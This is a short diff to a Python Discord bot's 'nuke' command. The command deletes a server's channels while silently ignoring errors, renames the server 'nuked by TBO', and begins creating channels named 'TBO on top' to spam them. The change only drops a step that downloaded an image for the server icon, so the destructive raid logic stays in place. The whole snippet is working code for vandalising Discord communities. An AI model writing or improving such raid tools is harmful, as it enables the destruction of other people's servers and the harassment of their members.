@@ -161,11 +161,7 @@ async def nuke(interaction: discord.Interaction):
                 await channel.delete()
             except:
                 pass
-        async with aiohttp.ClientSession() as session:
-            async with session.get("https://media.discordapp.net/attachments/1302375719263014932/1403371786531508244/image0.jpg") as resp:
-                if resp.status == 200:
-                    img_bytes = await resp.read()
-                    await interaction.guild.edit(name="nuked by TBO", icon=img_bytes)
+        await interaction.guild.edit(name="nuked by TBO")
         async def create_and_spam():
             ch = await interaction.guild.create_text_channel("TBO on top")
             async def spam():
